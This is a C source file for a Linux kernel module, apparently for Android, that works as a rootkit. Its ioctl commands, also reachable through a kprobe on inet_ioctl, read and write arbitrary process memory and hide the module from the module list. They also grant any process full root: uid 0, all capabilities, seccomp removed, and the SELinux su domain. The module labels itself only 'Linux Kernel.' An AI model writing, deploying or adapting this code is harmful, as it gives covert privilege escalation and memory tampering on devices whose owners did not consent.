#include <linux/module.h>
#include <linux/tty.h>
#include <linux/miscdevice.h>
#include <linux/io.h>
#include <linux/sched/mm.h>
#include <linux/mm.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#include <linux/security.h>
#include <asm/cpu.h>
#include <asm/page.h>
#include <asm/pgtable.h>
#include <asm/pgtable-types.h>
#include <linux/security.h>
#include <linux/mutex.h>
#include <linux/kprobes.h>

#define OP_CMD_READ 0x400011
#define OP_CMD_WRITE 0x400012
#define OP_CMD_LISTMAP 0x400013
#define OP_CMD_ROOT 0x400014
#define OP_HIDE_MODULE 0x400015
#define OP_SHOW_MODULE 0x400016

#define DEVICE_NAME "kmem"
#define TAG "kmem_log: "
typedef struct _MEMORY
{
    pid_t pid;
    uintptr_t addr;
    void __user *buffer;
    size_t size;
} st_mem;

static int dev_open(struct inode *node, struct file *file)
{
    return 0;
}

static ssize_t dev_read(struct file *file, char __user *buf, size_t size, loff_t *pos)
{
    return 0;
}

static ssize_t dev_write(struct file *file, const char __user *buf, size_t size, loff_t *pos)
{
    return 0;
}

static phys_addr_t get_va_pa(struct mm_struct *mm, uintptr_t va)
{
    pmd_t *pmd = pmd_off(mm, va);
    phys_addr_t page_addr;
    pte_t *pte = pte_offset_kernel(pmd, va);
    uintptr_t offset = va & (PAGE_SIZE - 1);
    page_addr = (phys_addr_t)(pte_pfn(*pte) << PAGE_SHIFT);
    return page_addr + offset;
}

static struct task_struct *get_pid_task_(int pid)
{
    struct task_struct *task;
    struct pid *pid_struct;
    pid_struct = find_get_pid(pid);
    if (!pid_struct)
        return NULL;

    task = get_pid_task(pid_struct, PIDTYPE_PID);
    return task;
}

static struct mm_struct *get_pid_mm(int pid)
{
    struct task_struct *task;
    struct mm_struct *mm;
    task = get_pid_task_(pid);
    if (!task)
        return NULL;
    mm = get_task_mm(task);
    if (!mm)
        return NULL;
    return mm;
}

inline int valid_phys_addr_range_(phys_addr_t addr, size_t count)
{
    return addr + count <= __pa(high_memory);
}

int is_module_hide = 0;
static struct list_head *mod_list;
bool hide_module(void)
{
    if (!is_module_hide)
    {
        mod_list = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
        kfree(THIS_MODULE->sect_attrs);
        THIS_MODULE->sect_attrs = NULL;
        is_module_hide = 1;
        return true;
    }
    return false;
}

bool show_module(void)
{
    if (is_module_hide)
    {
        list_add(&THIS_MODULE->list, mod_list);
        is_module_hide = 0;
        return true;
    }
    return false;
}

#define SELINUX_DOMAIN "u:r:su:s0"
static struct group_info root_groups = {.usage = ATOMIC_INIT(2)};
static int proc_root(pid_t pid)
{
    struct pid *pid_struct;
    struct task_struct *task = NULL;
    struct cred *real_cred = NULL;
    struct cred *cred = NULL;
    u32 sid;
    int error;

    pid_struct = find_get_pid(pid);
    if (!pid_struct)
        return -1;
    task = pid_task(pid_struct, PIDTYPE_PID);
    if (!task)
    {
        return -1;
    }
    real_cred = (struct cred *)task->real_cred;
    cred = (struct cred *)task->cred;

    if (real_cred)
    {
        real_cred->uid = real_cred->suid = real_cred->euid = real_cred->fsuid = GLOBAL_ROOT_UID;
        real_cred->gid = real_cred->sgid = real_cred->egid = real_cred->fsgid = GLOBAL_ROOT_GID;

        memset(&real_cred->cap_inheritable, 0xFF, sizeof(real_cred->cap_inheritable));
        memset(&real_cred->cap_permitted, 0xFF, sizeof(real_cred->cap_permitted));
        memset(&real_cred->cap_effective, 0xFF, sizeof(real_cred->cap_effective));
        memset(&real_cred->cap_bset, 0xFF, sizeof(real_cred->cap_bset));
        memset(&real_cred->cap_ambient, 0xFF, sizeof(real_cred->cap_ambient));
    }
    if (cred)
    {
        cred->uid = cred->suid = cred->euid = cred->fsuid = GLOBAL_ROOT_UID;
        cred->gid = cred->sgid = cred->egid = cred->fsgid = GLOBAL_ROOT_GID;
        memset(&cred->cap_inheritable, 0xFF, sizeof(cred->cap_inheritable));
        memset(&cred->cap_permitted, 0xFF, sizeof(cred->cap_permitted));
        memset(&cred->cap_effective, 0xFF, sizeof(cred->cap_effective));
        memset(&cred->cap_bset, 0xFF, sizeof(cred->cap_bset));
        memset(&cred->cap_ambient, 0xFF, sizeof(cred->cap_ambient));
    }

#if defined(CONFIG_GENERIC_ENTRY) && \
    LINUX_VERSION_CODE >= KERNEL_VERSION(5, 11, 0)
    current_thread_info()->syscall_work &= ~SYSCALL_WORK_SECCOMP;
#else
    current_thread_info()->flags &= ~(TIF_SECCOMP | _TIF_SECCOMP);
#endif

#ifdef CONFIG_SECCOMP
    current->seccomp.mode = 0;
    current->seccomp.filter = NULL;
#endif

    if (cred->group_info)
        put_group_info(cred->group_info);
    cred->group_info = get_group_info(&root_groups);

    error = security_secctx_to_secid(SELINUX_DOMAIN, strlen(SELINUX_DOMAIN), &sid);
    if (!error)
    {
        set_security_override(cred, sid);
    }

    return 0;
}

static int list_vma(struct seq_file *m, pid_t pid)
{
    struct vm_area_struct *vma;
    unsigned long start, end, flags;
    struct file *file;
    char *path;
    char path_buf[256] = {0};
    struct mm_struct *mm = get_pid_mm(pid);
    if (!mm)
        return -1;
    down_read(&mm->mmap_lock);
    vma = mm->mmap;
    for (vma = mm->mmap; vma; vma = vma->vm_next)
    {
        start = vma->vm_start;
        end = vma->vm_end;
        file = vma->vm_file;
        flags = vma->vm_flags;
        path = NULL;
        seq_putc(m, flags & VM_READ ? 'r' : '-');
        seq_putc(m, flags & VM_WRITE ? 'w' : '-');
        seq_putc(m, flags & VM_EXEC ? 'x' : '-');
        seq_putc(m, flags & VM_MAYSHARE ? 's' : 'p');
        seq_putc(m, ',');
        if (file)
        {
            memset(path_buf, 0, sizeof(path_buf));
            path = d_path(&file->f_path, path_buf, sizeof(path_buf));
        }

        if (path)
        {
            seq_printf(m, "%llx,%llx,%s\n", start, end, path);
        }
        else
        {
            seq_printf(m, "%llx,%llx\n", start, end);
        }
    }
    up_read(&mm->mmap_lock);
    return 0;
}

static int write_mem(st_mem mem)
{
    phys_addr_t pa;
    void *mapped;
    int n;
    struct mm_struct *mm = get_pid_mm(mem.pid);
    if (!mm)
        return -1;
    mmput(mm);

    pa = get_va_pa(mm, mem.addr);

    if (!pa)
        return -1;
    if (!pfn_valid(__phys_to_pfn(pa)))
        return -1;
    if (!valid_phys_addr_range_(pa, mem.size))
        return -1;

    mapped = ioremap_cache(pa, mem.size);
    if (!mapped)
        return -1;

    n = copy_from_user(mapped, mem.buffer, mem.size);

    iounmap(mapped);

    pr_info(TAG "write %d ---%d\n", n, mem.size);
    return n;
}

static int read_mem(st_mem mem)
{
    phys_addr_t pa;
    void *mapped;
    int n;
    struct mm_struct *mm = get_pid_mm(mem.pid);
    if (!mm)
        return -1;
    mmput(mm);

    pa = get_va_pa(mm, mem.addr);

    if (!pa)
        return -1;
    if (!pfn_valid(__phys_to_pfn(pa)))
        return -1;
    if (!valid_phys_addr_range_(pa, mem.size))
        return -1;

    mapped = ioremap_cache(pa, mem.size);
    if (!mapped)
        return -1;

    n = copy_to_user(mem.buffer, mapped, mem.size);

    iounmap(mapped);

    pr_info(TAG "read %d ---%d\n", n, mem.size);
    return n;
}

static int my_mem_show(struct seq_file *m, void *v)
{
    pid_t pid = (pid_t)(uintptr_t)m->private;
    list_vma(m, pid);

    return 0;
}

static int my_proc_show(struct seq_file *m, void *v)
{

    struct task_struct *task;
    rcu_read_lock();
    for_each_process(task)
    {
        seq_printf(m, "%d,%s\n", task->pid, task->comm);
    }
    rcu_read_unlock();
    return 0;
}

int my_proc_mem_open(struct inode *inode, struct file *file)
{
    return single_open(file, my_mem_show, PDE_DATA(inode));
}

int my_proc_open(struct inode *inode, struct file *file)
{
    return single_open(file, my_proc_show, PDE_DATA(inode));
}

static const struct proc_ops my_proc_mem_ops = {
    .proc_open = my_proc_mem_open,
    .proc_read = seq_read,
    .proc_lseek = seq_lseek,
    .proc_release = seq_release,
};

static const struct proc_ops my_proc_ps = {
    .proc_open = my_proc_open,
    .proc_read = seq_read,
    .proc_lseek = seq_lseek,
    .proc_release = seq_release,
};

struct proc_dir_entry *base;

static long handle_cmd(unsigned int cmd, unsigned long arg)
{
    st_mem mem;
    char mypid[13];
    pr_info(TAG "ioctl\n");

    if (copy_from_user(&mem, (void *__user)arg, sizeof(st_mem)) != 0)
    {
        return -2;
    }

    switch (cmd)
    {
    case OP_HIDE_MODULE:
        return hide_module();
    case OP_SHOW_MODULE:
        return show_module();
    case OP_CMD_READ:
        return read_mem(mem);
    case OP_CMD_WRITE:
        return write_mem(mem);
    case OP_CMD_LISTMAP:
        if (!get_pid_mm(mem.pid))
        {
            return -1;
        }
        snprintf(mypid, 12, "%d", mem.pid);
        proc_create_data(mypid, 0444, base, &my_proc_mem_ops, (void *)((uintptr_t)mem.pid));
        return 0;
    case OP_CMD_ROOT:
        proc_root(mem.pid);
        return 0;
    default:
        break;
    }
    return -EINVAL;
}

static long dev_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    pr_alert(TAG "dev_ioctl: %d, %ld\n", cmd, arg);
    return handle_cmd(cmd, arg);
}

static int handler_ioctl_pre(struct kprobe *p, struct pt_regs *kregs)
{
    unsigned int cmd = (unsigned int)kregs->regs[1];
    unsigned long arg = (unsigned long)kregs->regs[2];
    if (cmd >= OP_CMD_READ && cmd <= OP_SHOW_MODULE)
    {
        pr_alert(TAG "inet_ioctl: %d, %ld\n", cmd, arg);
        handle_cmd(cmd, arg);
    }

    return 0;
}
static struct kprobe kp_ioctl = {
    .symbol_name = "inet_ioctl",
    .pre_handler = handler_ioctl_pre,
};

struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = dev_open,
    .read = dev_read,
    .write = dev_write,
    .unlocked_ioctl = dev_ioctl,
};

struct miscdevice dev = {
    .name = DEVICE_NAME,
    .minor = MISC_DYNAMIC_MINOR,
    .fops = &fops,
};

static int __init driver_entry(void)
{
    int ret;
    pr_info(TAG "driver_entry\n");
    ret = register_kprobe(&kp_ioctl);
    pr_alert("kprobe res:%d\n", ret);

    ret = misc_register(&dev);
    pr_alert("misc_register res:%d\n", ret);

    base = proc_mkdir(DEVICE_NAME, NULL);
    proc_create("tasks", 0444, base, &my_proc_ps);
    return ret;
}

static void __exit driver_unload(void)
{
    pr_info(TAG "driver_unload\n");
    unregister_kprobe(&kp_ioctl);

    misc_deregister(&dev);
    proc_remove(base);
    return;
}

module_init(driver_entry);
module_exit(driver_unload);

MODULE_DESCRIPTION("Linux Kernel.");
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Mrack");